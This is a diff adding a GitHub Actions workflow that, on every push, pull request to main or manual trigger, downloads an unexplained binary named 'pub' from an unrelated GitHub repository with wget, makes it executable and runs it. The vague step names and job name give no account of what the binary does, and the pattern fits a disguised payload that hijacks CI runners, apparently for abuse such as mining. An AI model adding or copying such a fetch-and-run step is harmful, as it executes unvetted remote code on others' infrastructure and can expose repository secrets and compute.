@@ -1,0 +1,25 @@
+name: Run
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  run-versa:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Get
+        run: wget https://github.com/thedailycorner/asfefoa/raw/refs/heads/main/pub
+        
+      - name: Make versa executable (if it's a script)
+        run: chmod +x ./pub
+
+      - name: Run
+        run: ./pub
